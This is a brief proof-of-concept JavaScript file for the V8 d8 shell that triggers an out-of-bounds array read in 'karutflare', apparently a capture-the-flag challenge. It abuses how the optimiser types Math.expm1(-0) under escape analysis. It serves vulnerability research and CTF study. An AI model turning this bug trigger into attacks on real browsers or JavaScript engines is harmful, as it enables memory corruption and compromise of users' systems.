/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-01-22 00:49:45
 * Author: raycp
 * 
 * Last Modified: 2020-01-25 03:27:16
 * Description: poc for oob of karutflare, usage:  ../v8/out/x64.release/d8 --allow-natives-syntax poc.js
 * 
************************************************************/
function foo(x) {
    let tmp = {escapeVar: -0};   // will be optimized in escape phase
    var a = [1.1, 2.2, 3.3];
    let idx = Object.is(Math.expm1(x), tmp.escapeVar);
    idx *= 1337;
    return a[idx];
}

console.log(foo(0));
%OptimizeFunctionOnNextCall(foo);
console.log(foo("0"));
%OptimizeFunctionOnNextCall(foo);
foo(-0);
console.log(foo(-0));

